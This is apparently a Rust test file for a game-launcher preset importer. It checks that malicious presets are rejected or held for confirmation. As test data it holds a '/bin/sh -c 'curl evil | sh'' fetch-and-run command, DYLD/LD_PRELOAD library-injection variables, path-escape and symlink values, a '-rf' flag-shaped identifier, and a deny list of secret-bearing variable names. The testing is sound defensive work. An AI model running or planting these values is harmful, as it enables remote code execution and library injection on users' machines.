use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use applejack_config::presets::{self, Confirmation, Rejected};
use applejack_config::{
    ConfigDb, EnvPolicy, Error, GameConfig, GraphicsBackend, ImportOptions, Preset,
};

const MALICIOUS_PRESET: &str = include_str!("fixtures/malicious-preset.json");
const ATTACKER_ENV: &str = include_str!("fixtures/attacker-env.json");
const ATTACKER_RELATIVE_ESCAPE: &str = include_str!("fixtures/attacker-relative-escape.json");
const ATTACKER_UNKNOWN_KEYS: &str = include_str!("fixtures/attacker-unknown-keys.json");
const ATTACKER_D3DMETAL_UNINSTALLED: &str =
    include_str!("fixtures/attacker-d3dmetal-uninstalled.json");
const ATTACKER_FLAG_IDENTIFIERS: &str = include_str!("fixtures/attacker-flag-identifiers.json");

const ALLOWED: [&str; 16] = [
    "PATH",
    "HOME",
    "TMPDIR",
    "WINEPREFIX",
    "WINEDEBUG",
    "WINEDLLOVERRIDES",
    "WINEMSYNC",
    "WINEESYNC",
    "DXMT_CONFIG",
    "DXMT_CONFIG_FILE",
    "DXMT_LOG_LEVEL",
    "MTL_HUD_ENABLED",
    "ROSETTA_ADVERTISE_AVX",
    "GST_PLUGIN_PATH",
    "APPLEJACK_SESSION",
    "VK_ICD_FILENAMES",
];

/// Per-name roots like the default policy: a prefix path stays under
/// `prefixes/`, native code and config paths stay under `engines/`.
struct FixturePolicy {
    engines: Vec<PathBuf>,
    prefixes: Vec<PathBuf>,
    /// Engine versions with an accepted `D3DMetal` overlay.
    overlay_versions: Vec<&'static str>,
}

impl FixturePolicy {
    fn new(data_dir: &Path, overlay_versions: &[&'static str]) -> Self {
        Self {
            engines: vec![data_dir.join("engines")],
            prefixes: vec![data_dir.join("prefixes")],
            overlay_versions: overlay_versions.to_vec(),
        }
    }
}

impl EnvPolicy for FixturePolicy {
    fn allows(&self, name: &str) -> bool {
        ALLOWED.contains(&name)
    }

    fn roots_for(&self, name: &str) -> &[PathBuf] {
        match name {
            "WINEPREFIX" => &self.prefixes,
            "VK_ICD_FILENAMES" | "GST_PLUGIN_PATH" | "DXMT_CONFIG_FILE" => &self.engines,
            _ => &[],
        }
    }

    fn d3dmetal_overlay_present(&self, engine_version: Option<&str>) -> bool {
        engine_version.is_some_and(|version| self.overlay_versions.contains(&version))
    }
}

fn home() -> PathBuf {
    PathBuf::from("/Users/example")
}

fn data_dir() -> PathBuf {
    home().join("Library/Application Support/applejack")
}

fn rejected<'a>(items: &'a [Rejected], field: &str) -> &'a Rejected {
    items
        .iter()
        .find(|item| item.field == field)
        .unwrap_or_else(|| panic!("{field} not rejected: {items:?}"))
}

fn preset_with(config: GameConfig) -> Preset {
    Preset {
        schema: 1,
        appid: 3,
        engine_id: None,
        engine_version: None,
        host_chip: None,
        macos_version: None,
        config,
    }
}

/// A directory under the system temp dir, removed on drop.
struct TempDir(PathBuf);

impl TempDir {
    fn new(label: &str) -> Self {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map_or(0, |d| d.as_nanos());
        let path = std::env::temp_dir().join(format!(
            "applejack-config-presets-{label}-{}-{nanos}",
            std::process::id()
        ));
        std::fs::create_dir_all(&path).unwrap();
        Self(path)
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

#[test]
fn malicious_preset_is_rejected_or_held_for_confirmation() {
    let preset = Preset::from_json(MALICIOUS_PRESET).unwrap();
    let policy = FixturePolicy::new(&data_dir(), &[]);
    let plan = presets::import(
        &preset,
        &policy,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();

    let icd = rejected(&plan.rejected, "extra_env.VK_ICD_FILENAMES");
    assert_eq!(icd.value, "/tmp/evil.json");
    assert!(icd.reason.contains("outside"), "{icd:?}");
    let dyld = rejected(&plan.rejected, "extra_env.DYLD_INSERT_LIBRARIES");
    assert!(dyld.reason.contains("DYLD_*"), "{dyld:?}");
    let d3dmetal = rejected(&plan.rejected, "graphics_backend");
    assert_eq!(d3dmetal.value, "d3dmetal");
    assert!(d3dmetal.reason.contains("overlay"), "{d3dmetal:?}");
    assert!(d3dmetal.reason.contains("1.0.0"), "{d3dmetal:?}");
    assert_eq!(plan.rejected.len(), 3, "{:?}", plan.rejected);

    assert_eq!(
        plan.confirmations,
        [
            Confirmation {
                field: "launch_exe_override".to_owned(),
                value: "/bin/sh".to_owned(),
            },
            Confirmation {
                field: "launch_args_override".to_owned(),
                value: "-c 'curl evil | sh'".to_owned(),
            },
        ]
    );
    assert!(plan.needs_confirmation());

    // WINEDLLOVERRIDES is an allowed name, so the env policy passes it; the
    // engine refuses ntdll overrides at launch (U6b), and the plan warns.
    assert_eq!(plan.warnings.len(), 1, "{:?}", plan.warnings);
    assert_eq!(plan.warnings[0].field, "extra_env.WINEDLLOVERRIDES");
    assert!(plan.warnings[0].reason.contains("ntdll"));
    assert_eq!(
        plan.config.extra_env.keys().collect::<Vec<_>>(),
        ["WINEDEBUG", "WINEDLLOVERRIDES"]
    );
    assert_eq!(plan.config.graphics_backend, None);
    assert_eq!(plan.config.hidraw_enabled, Some(true));
    assert!(plan.accepted.iter().any(|item| item.field == "engine_id"));

    let db = ConfigDb::open_in_memory().unwrap();
    let error = plan.apply(&db).unwrap_err();
    assert!(
        matches!(error, Error::ConfirmationRequired(ref items) if items.len() == 2),
        "{error}"
    );
    assert!(
        error.to_string().contains("\"-c 'curl evil | sh'\""),
        "values are Debug-escaped: {error}"
    );
    assert_eq!(
        db.game_config(10).unwrap(),
        None,
        "nothing written without confirmation"
    );
}

#[test]
fn confirmed_import_writes_filtered_config_only() {
    let preset = Preset::from_json(MALICIOUS_PRESET).unwrap();
    let policy = FixturePolicy::new(&data_dir(), &[]);
    let options = ImportOptions {
        accept_launch_overrides: true,
    };
    let plan = presets::import(&preset, &policy, &data_dir(), None, options).unwrap();
    assert!(!plan.needs_confirmation());

    let db = ConfigDb::open_in_memory().unwrap();
    db.set_field(10, "notes", "kept").unwrap();
    db.set_field(10, "extra_env", "DXMT_LOG_LEVEL=info")
        .unwrap();
    plan.apply(&db).unwrap();
    let stored = db.game_config(10).unwrap().unwrap();
    assert_eq!(stored.notes.as_deref(), Some("kept"));
    assert_eq!(stored.graphics_backend, None);
    assert_eq!(stored.launch_exe_override.as_deref(), Some("/bin/sh"));
    assert_eq!(
        stored.extra_env.keys().collect::<Vec<_>>(),
        ["DXMT_LOG_LEVEL", "WINEDEBUG", "WINEDLLOVERRIDES"]
    );
    assert!(!stored.extra_env.contains_key("VK_ICD_FILENAMES"));
    assert!(!stored.extra_env.contains_key("DYLD_INSERT_LIBRARIES"));
}

#[test]
fn d3dmetal_imports_only_for_an_accepted_engine_version() {
    let preset = Preset::from_json(MALICIOUS_PRESET).unwrap();
    let policy = FixturePolicy::new(&data_dir(), &["1.0.0"]);
    let plan = presets::import(
        &preset,
        &policy,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    assert_eq!(
        plan.config.graphics_backend,
        Some(GraphicsBackend::D3dmetal)
    );
    assert!(
        !plan
            .rejected
            .iter()
            .any(|item| item.field == "graphics_backend")
    );

    // The same preset without an engine version is refused even though an
    // overlay exists: the gate needs to know which engine it belongs to.
    let mut unversioned = preset.clone();
    unversioned.config.engine_version = None;
    let plan = presets::import(
        &unversioned,
        &policy,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    let item = rejected(&plan.rejected, "graphics_backend");
    assert!(item.reason.contains("engine version"), "{item:?}");
    assert_eq!(plan.config.graphics_backend, None);

    // An engine version that failed the identifier check counts as unset.
    let mut flagged = preset.clone();
    flagged.config.engine_version = Some("-1.0.0".to_owned());
    let plan = presets::import(
        &flagged,
        &policy,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    rejected(&plan.rejected, "engine_version");
    rejected(&plan.rejected, "graphics_backend");
}

#[test]
fn d3dmetal_for_an_uninstalled_engine_version_is_rejected() {
    let preset = Preset::from_json(ATTACKER_D3DMETAL_UNINSTALLED).unwrap();
    assert_eq!(preset.config.engine_version.as_deref(), Some("9.9"));
    let policy = FixturePolicy::new(&data_dir(), &["1.0.0"]);
    let plan = presets::import(
        &preset,
        &policy,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    let item = rejected(&plan.rejected, "graphics_backend");
    assert!(item.reason.contains("9.9"), "{item:?}");
    assert_eq!(plan.config.graphics_backend, None);
    assert_eq!(plan.config.engine_version.as_deref(), Some("9.9"));
}

#[test]
fn data_dir_placeholder_expands_before_the_root_check() {
    let data = data_dir();
    let preset = preset_with(GameConfig {
        extra_env: BTreeMap::from([
            (
                "VK_ICD_FILENAMES".to_owned(),
                "$APPLEJACK_DATA_DIR/engines/rosetta-wine/1.0/icd.json".to_owned(),
            ),
            (
                "GST_PLUGIN_PATH".to_owned(),
                "$APPLEJACK_DATA_DIR/../escape".to_owned(),
            ),
            ("WINEPREFIX".to_owned(), "prefixes/relative".to_owned()),
            ("UNKNOWN_VAR".to_owned(), "1".to_owned()),
            ("API_TOKEN".to_owned(), "1".to_owned()),
        ]),
        direct_verified_at: Some("2026-10-28T00:00:00Z".to_owned()),
        ..GameConfig::default()
    });
    let policy = FixturePolicy::new(&data, &[]);
    let plan = presets::import(&preset, &policy, &data, None, ImportOptions::default()).unwrap();
    assert_eq!(
        plan.config.extra_env["VK_ICD_FILENAMES"],
        format!("{}/engines/rosetta-wine/1.0/icd.json", data.display())
    );
    assert!(
        rejected(&plan.rejected, "extra_env.GST_PLUGIN_PATH")
            .reason
            .contains("..")
    );
    assert!(
        rejected(&plan.rejected, "extra_env.WINEPREFIX")
            .reason
            .contains("absolute")
    );
    assert!(
        rejected(&plan.rejected, "extra_env.UNKNOWN_VAR")
            .reason
            .contains("allowlist")
    );
    assert!(
        rejected(&plan.rejected, "extra_env.API_TOKEN")
            .reason
            .contains("secret")
    );
    assert!(
        rejected(&plan.rejected, "direct_verified_at")
            .reason
            .contains("host-local")
    );
    assert_eq!(plan.confirmations, Vec::new());
    assert!(!plan.needs_confirmation());
    let db = ConfigDb::open_in_memory().unwrap();
    plan.apply(&db).unwrap();
    let stored = db.game_config(3).unwrap().unwrap();
    assert_eq!(stored.extra_env.len(), 1);
    assert_eq!(stored.direct_verified_at, None);
}

#[test]
fn home_placeholder_expands_only_when_the_host_supplies_home() {
    let data = data_dir();
    let preset = preset_with(GameConfig {
        extra_env: BTreeMap::from([(
            "WINEPREFIX".to_owned(),
            "$HOME/Library/Application Support/applejack/prefixes/game".to_owned(),
        )]),
        launch_exe_override: Some("$HOME/Games/game.exe".to_owned()),
        notes: Some("see $HOME/notes.txt".to_owned()),
        ..GameConfig::default()
    });
    let policy = FixturePolicy::new(&data, &[]);
    let plan = presets::import(
        &preset,
        &policy,
        &data,
        Some(&home()),
        ImportOptions::default(),
    )
    .unwrap();
    assert!(plan.rejected.is_empty(), "{:?}", plan.rejected);
    assert_eq!(
        plan.config.extra_env["WINEPREFIX"],
        format!("{}/prefixes/game", data.display())
    );
    assert_eq!(
        plan.confirmations[0].value,
        format!("{}/Games/game.exe", home().display())
    );
    assert_eq!(
        plan.config.notes.as_deref(),
        Some("see /Users/example/notes.txt")
    );

    let plan = presets::import(&preset, &policy, &data, None, ImportOptions::default()).unwrap();
    let item = rejected(&plan.rejected, "extra_env.WINEPREFIX");
    assert!(item.reason.contains("absolute"), "{item:?}");
    assert_eq!(plan.confirmations[0].value, "$HOME/Games/game.exe");
}

#[test]
fn attacker_env_fixture_keeps_only_the_plain_option_string() {
    let data = data_dir();
    let preset = Preset::from_json(ATTACKER_ENV).unwrap();
    let policy = FixturePolicy::new(&data, &[]);
    let plan = presets::import(&preset, &policy, &data, None, ImportOptions::default()).unwrap();
    let expectations = [
        ("vk_icd_filenames", "allowlist"),
        ("Vk_Icd_Filenames", "allowlist"),
        ("dyld_insert_libraries", "DYLD_*"),
        ("Ld_Preload", "LD_*"),
        ("VK_ICD_FILENAMES", ".."),
        ("GST_PLUGIN_PATH", "outside"),
        ("WINEPREFIX", "outside"),
        ("WINEDEBUG", "control"),
        ("WINEESYNC", "control"),
        ("MTL_HUD_ENABLED", "control"),
        ("VK\u{130}CD_FILENAMES", "not a valid"),
        ("PATH", "launcher"),
        ("path", "launcher"),
        ("\u{ff30}\u{ff21}\u{ff34}\u{ff28}", "not a valid"),
    ];
    for (name, reason) in expectations {
        let item = rejected(&plan.rejected, &format!("extra_env.{name}"));
        assert!(item.reason.contains(reason), "{item:?}");
    }
    assert_eq!(
        plan.rejected.len(),
        expectations.len(),
        "{:?}",
        plan.rejected
    );
    assert_eq!(
        plan.config.extra_env,
        BTreeMap::from([("DXMT_CONFIG".to_owned(), "engines/x.conf".to_owned())]),
        "DXMT_CONFIG is an option string, not a path"
    );
}

#[test]
fn launch_exe_override_cannot_escape_its_placeholder_directory() {
    let data = data_dir();
    let preset = Preset::from_json(ATTACKER_RELATIVE_ESCAPE).unwrap();
    let policy = FixturePolicy::new(&data, &[]);
    let plan = presets::import(&preset, &policy, &data, None, ImportOptions::default()).unwrap();
    let exe = rejected(&plan.rejected, "launch_exe_override");
    assert!(exe.reason.contains("escapes"), "{exe:?}");
    assert_eq!(plan.confirmations, Vec::new());
    assert_eq!(plan.config.launch_exe_override, None);
    let icd = rejected(&plan.rejected, "extra_env.VK_ICD_FILENAMES");
    assert!(
        icd.reason.contains("outside"),
        "the data dir itself: {icd:?}"
    );
    assert_eq!(
        plan.config.extra_env["GST_PLUGIN_PATH"],
        format!("{}/engines", data.display())
    );
    assert_eq!(
        plan.config.extra_env["DXMT_CONFIG"], "${APPLEJACK_DATA_DIR}/engines/x",
        "a braced placeholder is not expanded; the value is plain text"
    );

    let dotted = preset_with(GameConfig {
        launch_exe_override: Some(
            "$APPLEJACK_DATA_DIR/prefixes/./game/../game/drive_c/g.exe".to_owned(),
        ),
        ..GameConfig::default()
    });
    let plan = presets::import(&dotted, &policy, &data, None, ImportOptions::default()).unwrap();
    assert!(plan.rejected.is_empty(), "{:?}", plan.rejected);
    assert_eq!(
        plan.confirmations[0].value,
        format!("{}/prefixes/game/drive_c/g.exe", data.display()),
        "the confirmed value is the normalized path"
    );
    assert_eq!(
        plan.config.launch_exe_override.as_deref(),
        Some(plan.confirmations[0].value.as_str())
    );
}

#[test]
fn symlinked_ancestor_outside_the_root_is_rejected() {
    let temp = TempDir::new("symlink");
    let data = temp.0.clone();
    std::fs::create_dir_all(data.join("prefixes")).unwrap();
    std::fs::create_dir_all(data.join("engines/rosetta-wine/1.0")).unwrap();
    std::os::unix::fs::symlink("/tmp", data.join("prefixes/link")).unwrap();
    std::os::unix::fs::symlink("/tmp", data.join("engines/link")).unwrap();
    let preset = preset_with(GameConfig {
        extra_env: BTreeMap::from([
            (
                "WINEPREFIX".to_owned(),
                format!("{}/prefixes/link/x", data.display()),
            ),
            (
                "VK_ICD_FILENAMES".to_owned(),
                format!("{}/engines/link/evil.json", data.display()),
            ),
            (
                "GST_PLUGIN_PATH".to_owned(),
                format!("{}/engines/rosetta-wine/1.0/plugins", data.display()),
            ),
        ]),
        ..GameConfig::default()
    });
    let policy = FixturePolicy::new(&data, &[]);
    let plan = presets::import(&preset, &policy, &data, None, ImportOptions::default()).unwrap();
    for name in ["WINEPREFIX", "VK_ICD_FILENAMES"] {
        let item = rejected(&plan.rejected, &format!("extra_env.{name}"));
        assert!(item.reason.contains("symlink"), "{item:?}");
    }
    assert_eq!(plan.rejected.len(), 2, "{:?}", plan.rejected);
    assert_eq!(
        plan.config.extra_env.keys().collect::<Vec<_>>(),
        ["GST_PLUGIN_PATH"],
        "a real path under a temp dir that is itself a symlink target still passes"
    );
}

#[test]
fn control_characters_in_text_fields_are_rejected() {
    let preset = preset_with(GameConfig {
        launch_exe_override: Some("/bin/sh\nreject   launch_exe_override = forged".to_owned()),
        launch_args_override: Some("-windowed".to_owned()),
        notes: Some("\u{1b}[2J".to_owned()),
        dx12_expectation: Some("tab\there".to_owned()),
        ..GameConfig::default()
    });
    let plan = presets::import(
        &preset,
        &FixturePolicy::new(&data_dir(), &[]),
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    for field in ["launch_exe_override", "notes", "dx12_expectation"] {
        assert!(
            rejected(&plan.rejected, field).reason.contains("control"),
            "{field}"
        );
    }
    assert_eq!(plan.rejected.len(), 3, "{:?}", plan.rejected);
    assert_eq!(plan.confirmations.len(), 1);
    assert_eq!(plan.confirmations[0].field, "launch_args_override");
    assert_eq!(plan.config.launch_exe_override, None);
}

#[test]
fn unknown_config_keys_fail_to_parse_by_name() {
    let error = Preset::from_json(ATTACKER_UNKNOWN_KEYS).unwrap_err();
    assert!(matches!(error, Error::Json(_)), "{error}");
    assert!(error.to_string().contains("launch_exe_overide"), "{error}");
}

#[test]
fn flag_shaped_engine_id_is_rejected() {
    let preset = Preset::from_json(ATTACKER_FLAG_IDENTIFIERS).unwrap();
    let plan = presets::import(
        &preset,
        &FixturePolicy::new(&data_dir(), &[]),
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    let item = rejected(&plan.rejected, "engine_id");
    assert_eq!(item.value, "-rf");
    assert!(item.reason.contains("'-'"), "{item:?}");
    assert_eq!(plan.config.engine_id, None);
}

#[test]
fn hand_written_preset_with_only_required_keys_parses() {
    let preset = Preset::from_json(r#"{"schema":1,"appid":5,"config":{}}"#).unwrap();
    assert_eq!(preset.schema, 1);
    assert_eq!(preset.appid, 5);
    assert_eq!(preset.engine_id, None);
    assert_eq!(preset.engine_version, None);
    assert_eq!(preset.host_chip, None);
    assert_eq!(preset.macos_version, None);
    assert_eq!(preset.config, GameConfig::default());
    let plan = presets::import(
        &preset,
        &FixturePolicy::new(&data_dir(), &[]),
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    assert!(plan.accepted.is_empty() && plan.rejected.is_empty());
}

/// Allows every name and path, so only the policy-independent hard stops
/// in `import` can reject.
struct PermissivePolicy;

impl EnvPolicy for PermissivePolicy {
    fn allows(&self, _: &str) -> bool {
        true
    }

    fn roots_for(&self, _: &str) -> &[PathBuf] {
        &[]
    }

    fn d3dmetal_overlay_present(&self, _: Option<&str>) -> bool {
        true
    }
}

#[test]
fn hard_stops_hold_under_a_permissive_policy() {
    let names = [
        "dyld_insert_libraries",
        "DYLD_LIBRARY_PATH",
        "LD_PRELOAD",
        "ld_library_path",
        "PATH",
        "path",
        "HOME",
        "WINELOADER",
        "BASH_ENV",
        "MY_TOKEN",
        "Pass_word",
        "API_KEY",
        "AUTH",
        "x_credential",
    ];
    let preset = preset_with(GameConfig {
        engine_id: Some("../../tmp/x".to_owned()),
        engine_version: Some(".hidden".to_owned()),
        extra_env: names
            .iter()
            .map(|name| ((*name).to_owned(), "/x".to_owned()))
            .chain([("WINEDEBUG".to_owned(), "-all".to_owned())])
            .collect(),
        ..GameConfig::default()
    });
    let plan = presets::import(
        &preset,
        &PermissivePolicy,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    assert!(
        rejected(&plan.rejected, "engine_id")
            .reason
            .contains("letters")
    );
    assert!(
        rejected(&plan.rejected, "engine_version")
            .reason
            .contains("letters")
    );
    for name in names {
        rejected(&plan.rejected, &format!("extra_env.{name}"));
    }
    assert_eq!(plan.rejected.len(), names.len() + 2, "{:?}", plan.rejected);
    assert_eq!(plan.config.engine_id, None);
    assert_eq!(plan.config.engine_version, None);
    assert_eq!(
        plan.config.extra_env.keys().collect::<Vec<_>>(),
        ["WINEDEBUG"]
    );
}

#[test]
fn export_then_import_round_trips_a_clean_config() {
    let data = data_dir();
    let home = home();
    let db = ConfigDb::open_in_memory().unwrap();
    db.set_field(10, "hidraw_enabled", "true").unwrap();
    db.set_field(10, "graphics_backend", "dxmt").unwrap();
    db.set_field(10, "extra_env", "WINEDEBUG=-all").unwrap();
    db.set_field(
        10,
        "extra_env",
        &format!(
            "DXMT_CONFIG_FILE={}/engines/rosetta-wine/1.0.user/dxmt.conf",
            data.display()
        ),
    )
    .unwrap();
    db.set_field(
        10,
        "extra_env",
        &format!("WINEPREFIX={}/prefixes/game", data.display()),
    )
    .unwrap();
    db.set_field(
        10,
        "launch_exe_override",
        &format!("{}/Games/game.exe", home.display()),
    )
    .unwrap();
    let preset = presets::export(&db, 10, &data, Some(&home)).unwrap();
    let json = preset.to_json_pretty().unwrap();
    assert!(json.contains("$APPLEJACK_DATA_DIR/engines"), "{json}");
    assert!(json.contains("\"$HOME/Games/game.exe\""), "{json}");
    assert!(!json.contains("/Users/"), "{json}");
    let parsed = Preset::from_json(&json).unwrap();
    let policy = FixturePolicy::new(&data, &[]);
    let options = ImportOptions {
        accept_launch_overrides: true,
    };
    let plan = presets::import(&parsed, &policy, &data, Some(&home), options).unwrap();
    assert!(plan.rejected.is_empty(), "{:?}", plan.rejected);
    assert_eq!(plan.confirmations.len(), 1);
    let target = ConfigDb::open_in_memory().unwrap();
    plan.apply(&target).unwrap();
    assert_eq!(target.game_config(10).unwrap(), db.game_config(10).unwrap());
}
